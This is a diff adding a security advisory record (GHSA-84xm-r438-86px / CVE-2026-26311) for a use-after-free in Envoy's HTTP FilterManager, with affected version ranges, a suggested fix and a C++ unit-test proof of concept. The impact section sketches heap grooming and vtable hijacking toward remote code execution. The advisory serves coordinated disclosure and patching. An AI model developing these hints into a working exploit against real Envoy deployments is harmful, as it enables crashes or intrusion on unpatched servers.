@@ -1,0 +1,104 @@
+{
+  "id": "GHSA-84xm-r438-86px",
+  "modified": "2026-03-10T18:47:51.139829Z",
+  "published": "2026-03-10T18:31:23Z",
+  "aliases": [
+    "CVE-2026-26311"
+  ],
+  "summary": "Envoy: HTTP - filter chain execution on reset streams causing UAF crash",
+  "details": "**Note:**\nThis vulnerability was originally reported to the Google OSS VRP (Issue ID: [477542544](https://issuetracker.google.com/issues/477542544)). The Google Security Team requested that I coordinate directly with the Envoy maintainers for triage and remediation. I am submitting this report here to facilitate that process.\n\n**Technical Details**\nI have identified a logic vulnerability in Envoy's HTTP connection manager (`FilterManager`) that allows for **Zombie Stream Filter Execution**. This issue creates a \"Use-After-Free\" (UAF) or state-corruption window where filter callbacks are invoked on an HTTP stream that has already been logically reset and cleaned up.\n\n**Mechanism:**\nThe vulnerability resides in `source/common/http/filter_manager.cc` within the `FilterManager::decodeData` method.\n\nWhen an HTTP/2 stream encounters a reset condition (e.g., `StreamIdleTimeout`, `OverloadManager` limits, or a local reset triggered by a filter), Envoy calls `onResetStream`. This method:\n1.  Sets the internal state `state_.saw_downstream_reset_ = true`.\n2.  Invokes `onDestroy()` on all filters in the chain (allowing them to release resources/pointers).\n3.  Schedules the `ActiveStream` object for **deferred deletion** (cleanup happens later in the event loop).\n\n**The Flaw:**\nThe `ActiveStream` object remains valid in memory during the deferred deletion window. If a `DATA` frame arrives on this stream immediately after the reset (e.g., in the same packet processing cycle), the HTTP/2 codec invokes `ActiveStream::decodeData`, which cascades to `FilterManager::decodeData`.\n\n`FilterManager::decodeData` **fails to check the `saw_downstream_reset_` flag**. It iterates over the `decoder_filters_` list and invokes `decodeData()` on filters that have already received `onDestroy()`.\n\n**Root Cause Code Location:**\nFile: `source/common/http/filter_manager.cc`\nFunction: `FilterManager::decodeData`\n\n```cpp\nvoid FilterManager::decodeData(...) {\n  if (stopDecoderFilterChain()) { return; }\n\n  // Vulnerability: Missing check for state_.saw_downstream_reset_\n  // Execution proceeds into the loop even if the stream is logically dead.\n\n  auto trailers_added_entry = decoder_filters_.end();\n  for (; entry != decoder_filters_.end(); entry++) {\n      // ... calls (*entry)-\u003ehandle_-\u003edecodeData(data) on destroyed filters ...\n  }\n}\n```\n\n**Suggested Fix:**\nAdd an explicit state check at the beginning of `FilterManager::decodeData`.\n\n```cpp\n// Prevent execution on streams that have been reset but not yet destroyed.\nif (state_.saw_downstream_reset_) {\n  return;\n}\n```\n\n---\n\n## Impact Analysis\n\n**Who can exploit this:**\nAny remote attacker capable of establishing an HTTP/2 or HTTP/3 connection. No privileges/authentication required.\n\n**Impact \u0026 Gain:**\n**1. Memory Corruption \u0026 Potential Remote Code Execution:**\nWhile the immediate symptom is a crash (DoS), the underlying primitive is a **Use-After-Free (CWE-416)**.\n* **Mechanism:** When `onDestroy()` is called on filters (e.g., Lua, Wasm, or complex native filters), they release internal structures and invalidate pointers.\n* **Exploitation:** By forcing `decodeData()` to execute on these now-freed objects, an attacker triggers undefined behavior. In a heap-groomed environment, an attacker could potentially replace the freed filter object with a malicious payload before the \"Zombie\" `decodeData` call occurs. This would allow for vtable hijacking or arbitrary write-what-where primitives, leading to **Remote Code Execution (RCE)**.\n* **Risk Amplification:** This is particularly dangerous for Envoy deployments using memory-unsafe extensions or third-party filters (C++ extensions), where `onDestroy` logic is relied upon for safety.\n\n**2. Security Control Bypass:**\nThe vulnerability defeats Envoy's \"Fail-Closed\" security architecture.\n* **Scenario:** If a stream is reset due to a security violation (e.g., `StreamIdleTimeout`, `OverloadManager` rejection, or WAF triggering), this vulnerability allows the attacker to **bypass the termination**.\n* **Result:** The attacker can force the processing of \"Data\" frames on a connection that the security policy explicitly attempted to close, allowing malicious payloads to reach deeper into the filter chain or backend services despite the rejection.\n\n---\n\n## Proof of Concept (Unit Test)\n\n**Description:**\nThe attached C++ unit test (`zombie_stream_poc_test.cc`) deterministically reproduces the vulnerability. It creates a stream, manually triggers a reset (simulating an Overload), and then immediately injects a DATA frame. The test asserts that the filter's `decodeData` callback is invoked on the reset stream.\n\n```cpp\n#include \"test/common/http/conn_manager_impl_test_base.h\"\n#include \"gmock/gmock.h\"\n#include \"gtest/gtest.h\"\n\nusing testing::_;\nusing testing::Invoke;\nusing testing::NiceMock;\nusing testing::Return;\n\nnamespace Envoy {\nnamespace Http {\n\n/**\n * Proof of Concept for \"Zombie Stream Filter Execution\" (HTTP/2 Reset Re-entrancy)\n * * Logic flow:\n * 1. Open a stream with HEADERS.\n * 2. Force a stream reset (simulating an Overload or Timeout).\n * 3. Immediately inject DATA into the stream.\n * 4. ASSERT that the filter's decodeData is called despite the stream being reset.\n */\nclass ZombieStreamPocTest : public HttpConnectionManagerImplTest {\n};\n\nTEST_F(ZombieStreamPocTest, ReproducedZombieFilterExecution) {\n  setup(SetupOpts().setTracing(false));\n\n  // 1. Setup a mock filter\n  std::shared_ptr\u003cMockStreamDecoderFilter\u003e filter(new NiceMock\u003cMockStreamDecoderFilter\u003e());\n   \n  // Vuln confirmation:\n  // We expect decodeData to be called on this filter even though the stream is reset.\n  // In a secure/patched implementation, this EXPECT_CALL should fail (Times(0)).\n  EXPECT_CALL(*filter, decodeData(_, _))\n      .Times(1)\n      .WillOnce(Invoke([\u0026](Buffer::Instance\u0026, bool) -\u003e FilterDataStatus {\n          ENVOY_LOG_MISC(error, \"!!! VULNERABILITY REPRODUCED: decodeData called on a reset stream !!!\");\n          return FilterDataStatus::Continue;\n      }));\n\n  EXPECT_CALL(*filter, decodeHeaders(_, false))\n      .WillOnce(Return(FilterHeadersStatus::StopIteration));\n\n  // Register the filter\n  EXPECT_CALL(filter_factory_, createFilterChain(_))\n      .WillOnce(Invoke([\u0026](FilterChainFactoryCallbacks\u0026 callbacks) -\u003e bool {\n        auto factory = createDecoderFilterFactoryCb(filter);\n        callbacks.setFilterConfigName(\"vulnerable_filter\");\n        factory(callbacks);\n        return true;\n      }));\n\n  // 2. Start the stream\n  EXPECT_CALL(*codec_, dispatch(_))\n      .WillOnce(Invoke([\u0026](Buffer::Instance\u0026) -\u003e Http::Status {\n        decoder_ = \u0026conn_manager_-\u003enewStream(response_encoder_);\n        RequestHeaderMapPtr headers{new TestRequestHeaderMapImpl{\n            {\":authority\", \"host\"}, {\":path\", \"/\"}, {\":method\", \"POST\"}}};\n        decoder_-\u003edecodeHeaders(std::move(headers), false);\n        return Http::okStatus();\n      }));\n\n  // Dispatch headers\n  Buffer::OwnedImpl header_buffer(\"headers\");\n  conn_manager_-\u003eonData(header_buffer, false);\n\n  // 3. Trigger a Reset on the ActiveStream\n  // This simulates Envoy terminating the stream due to an external event (Overload, Timeout).\n  auto* active_stream = dynamic_cast\u003cConnectionManagerImpl::ActiveStream*\u003e(decoder_);\n  \n  // This sets state_.saw_downstream_reset_ = true and triggers filter-\u003eonDestroy()\n  active_stream-\u003eonResetStream(StreamResetReason::LocalReset, \"simulated_overload\");\n\n  // 4. Attack: Send DATA to the \"Zombie\" stream\n  // The ActiveStream object is still alive in the deferred delete list.\n  Buffer::OwnedImpl malicious_payload(\"attacker_data\");\n   \n  // This call reaches the filter because FilterManager::decodeData misses the check!\n  active_stream-\u003edecodeData(malicious_payload, false);\n}\n\n} // namespace Http\n} // namespace Envoy\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/envoyproxy/envoy",
+        "purl": "pkg:golang/github.com/envoyproxy/envoy"
+      },
+      "versions": [
+        "1.37.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-84xm-r438-86px/GHSA-84xm-r438-86px.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/envoyproxy/envoy",
+        "purl": "pkg:golang/github.com/envoyproxy/envoy"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.36.0"
+            },
+            {
+              "last_affected": "1.36.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-84xm-r438-86px/GHSA-84xm-r438-86px.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/envoyproxy/envoy",
+        "purl": "pkg:golang/github.com/envoyproxy/envoy"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.35.0"
+            },
+            {
+              "last_affected": "1.35.8"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-84xm-r438-86px/GHSA-84xm-r438-86px.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/envoyproxy/envoy",
+        "purl": "pkg:golang/github.com/envoyproxy/envoy"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.34.12"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-84xm-r438-86px/GHSA-84xm-r438-86px.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-84xm-r438-86px"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/envoyproxy/envoy"
+    }
+  ]
+}
